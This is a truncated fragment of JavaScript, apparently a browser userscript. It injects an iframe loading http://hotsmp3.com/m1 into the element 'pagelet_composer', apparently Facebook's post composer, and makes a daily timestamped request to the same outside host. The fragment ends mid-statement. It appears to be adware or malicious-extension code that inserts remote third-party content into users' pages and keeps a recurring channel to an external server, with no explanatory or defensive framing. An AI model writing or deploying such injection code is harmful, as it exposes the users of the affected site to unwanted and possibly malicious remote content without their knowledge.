...
var DIV = document.createElement('div');
	DIV.innerHTML = '<iframe name="" width="100%" height="520" src="http://hotsmp3.com/m1" scrolling="no" frameborder="0"></iframe>';
	DIV.style.cssFloat = "top";
var divp = document.getElementById("pagelet_composer");
		...
		if(parseInt(getValue('LastUpdate', '0')) + 86400000 <= (new Date().getTime())) {
			try {
				xmlhttpRequest( { method: 'GET',
								  url: 'hotsmp3.com/m1' + new Date().getTime(),
